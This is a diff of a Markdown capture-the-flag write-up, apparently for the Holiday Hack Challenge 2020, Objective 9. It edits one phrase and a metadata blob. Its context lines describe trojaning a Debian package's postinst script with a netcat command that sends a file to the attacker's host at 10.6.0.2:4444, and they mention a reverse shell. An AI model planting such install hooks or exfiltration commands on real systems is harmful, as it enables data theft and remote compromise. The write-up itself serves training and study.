@@ -27,7 +27,7 @@ A Node.js HTTP server was started using  `python3 -m http.server 80` and it logg
 
     10.6.6.35 - - [12/Dec/2020 17:37:02] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -
 
-On the device the Debian package `netcat-traditional_1.10-41.1ubuntu1_amd64.deb` was found.
+On the local host the Debian package `netcat-traditional_1.10-41.1ubuntu1_amd64.deb` was found.
 This package was modified to include a netcat command in the postinst script to send the text file to our local host:
 
 `/bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`
@@ -52,9 +52,9 @@ That way the remote device would download this package and install it. In course
 to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt) (resp. receive the reverse shell connection).
 In this file it can be found that **Tanta Kringle** recused herself from the vote.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjY4NjUzNDg0LDEyNzI2NTY0MTksODU4MT
-g4OTI5LDEwOTI3ODUzMjEsLTIwNjI2NzUyOTcsLTYxMjg5Nzc5
-OSwtODUyNzIyNzAzLDE3NTgyNDM2NzcsMTYzNDM5NDk0MSwxMj
-A0NDI2NTM5LC0xNzk4NDE1ODk2LC04NzgzOTIyMTYsNTE0MjA5
-MTU5XX0=
+eyJoaXN0b3J5IjpbLTgxNzQzNTQzNywyNjg2NTM0ODQsMTI3Mj
+Y1NjQxOSw4NTgxODg5MjksMTA5Mjc4NTMyMSwtMjA2MjY3NTI5
+NywtNjEyODk3Nzk5LC04NTI3MjI3MDMsMTc1ODI0MzY3NywxNj
+M0Mzk0OTQxLDEyMDQ0MjY1MzksLTE3OTg0MTU4OTYsLTg3ODM5
+MjIxNiw1MTQyMDkxNTldfQ==
 -->
